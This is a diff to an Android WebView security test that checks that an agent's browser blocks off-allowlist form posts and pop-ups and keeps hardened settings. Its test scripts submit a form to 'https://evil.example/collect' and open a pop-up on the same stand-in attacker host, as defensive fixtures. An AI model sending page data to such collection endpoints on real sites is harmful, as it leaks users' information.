@@ -3,7 +3,9 @@ package com.coderarchitech.jobassistant.portals.web
 import android.webkit.WebSettings
 import androidx.test.ext.junit.runners.AndroidJUnit4
 import androidx.test.platform.app.InstrumentationRegistry
+import androidx.webkit.WebSettingsCompat
 import androidx.webkit.WebViewAssetLoader
+import androidx.webkit.WebViewFeature
 import org.junit.After
 import org.junit.Assert.assertEquals
 import org.junit.Assert.assertFalse
@@ -91,12 +93,18 @@ class AgentWebViewTest {
     }
 
     @Test
-    fun aPopUpAndAFormPostOffTheAllowlistAreStopped() {
-        run("popUp('https://evil.example/popup')")
-        assertEquals("https://evil.example/popup", nextStop().first)
-
+    fun aFormPostOffTheAllowlistIsStopped() {
         run("submitTo('https://evil.example/collect')")
+
         assertEquals("https://evil.example/collect", nextStop().first)
+        assertStillOnTheStartPage()
+    }
+
+    @Test
+    fun aPopUpOpensNothing() {
+        // With pop-up windows off, Chromium drops a script's window.open without a navigation to report.
+        run("popUp('https://evil.example/popup')")
+
         assertStillOnTheStartPage()
     }
 
@@ -127,11 +135,14 @@ class AgentWebViewTest {
     fun theSettingsAreHardened() =
         onMain {
             val settings = webView.settings
-            assertFalse(settings.allowFileAccess)
-            assertFalse(settings.allowContentAccess)
-            assertEquals(WebSettings.MIXED_CONTENT_NEVER_ALLOW, settings.mixedContentMode)
-            assertTrue(settings.safeBrowsingEnabled)
-            assertFalse(settings.javaScriptCanOpenWindowsAutomatically)
+            assertFalse("file access", settings.allowFileAccess)
+            assertFalse("content access", settings.allowContentAccess)
+            assertEquals("mixed content", WebSettings.MIXED_CONTENT_NEVER_ALLOW, settings.mixedContentMode)
+            assertFalse("pop-ups", settings.javaScriptCanOpenWindowsAutomatically)
+            // Older WebViews (the API 29 image) do not report the setting back; check it where they do.
+            if (WebViewFeature.isFeatureSupported(WebViewFeature.SAFE_BROWSING_ENABLE)) {
+                assertTrue("Safe Browsing", WebSettingsCompat.getSafeBrowsingEnabled(settings))
+            }
         }
 
     private fun run(script: String) = onMain { webView.evaluateJavascript(script, null) }
